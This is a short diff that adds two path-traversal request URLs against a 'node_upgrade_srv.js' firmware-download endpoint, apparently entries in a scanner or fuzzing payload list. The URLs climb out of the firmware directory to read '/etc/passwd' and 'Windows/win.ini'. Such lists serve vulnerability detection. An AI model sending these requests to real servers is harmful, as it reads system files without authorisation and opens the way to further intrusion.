@@ -1,0 +1,2 @@
+/server/node_upgrade_srv.js?action=downloadFirmware&firmware=/../../../../../../../../../../etc/passwd
+/server/node_upgrade_srv.js?action=downloadFirmware&firmware=/../../../../../../../../../../Windows/win.ini
